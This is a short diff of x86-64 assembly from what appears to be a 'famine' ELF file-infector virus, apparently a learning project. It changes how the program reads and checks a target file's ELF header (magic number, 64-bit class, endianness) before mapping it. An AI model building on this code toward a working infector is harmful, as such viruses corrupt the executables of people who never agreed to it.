@@ -89,19 +89,26 @@ section .text
 
             .magic_numbers:
                 mov rdi, VAR(famine.fd_file)
-                lea rsi, VAR(famine.elf_ehdr)
+                sub rsp, 64                     ;elf_ehdr struct buffer
+                lea rsi, [rsp]
+                ;lea rsi, VAR(famine.elf_ehdr)
                 mov rdx, 64   
                 mov rax, SC_READ
                 syscall
                 ; Magic numbers
-                cmp dword VAR(famine.elf_ehdr), MAGIC_NUMBERS
-                jne .close_file
+                cmp dword [rsp], MAGIC_NUMBERS
+                jne .exit_maigc_numbers
                 ; 64 bits
-                cmp byte VAR(famine.elf_ehdr + 4), 2     ;EI_CLASS
-                jne .close_file
+                cmp byte [rsp + 4], 2     ;EI_CLASS
+                jne .exit_maigc_numbers
                 ; Little endian
-                cmp byte VAR(famine.elf_ehdr + 5), 1     ;EI_CLASS
-                jne .close_file
+                cmp byte [rsp + 5], 1     ;EI_DATA (little endian)
+                jne .exit_maigc_numbers
+                jmp .mmap
+            
+            .exit_maigc_numbers:
+                add rsp, 64
+                jmp .close_file
 
             ; .fchmod:
             ;     mov rdi, VAR(famine.fd_file)
@@ -123,7 +130,7 @@ section .text
                 jle .close_file
 
 
-                .close_file:
+            .close_file:
                 mov rdi, VAR(famine.fd_file)
                 mov rax, SC_CLOSE
                 syscall
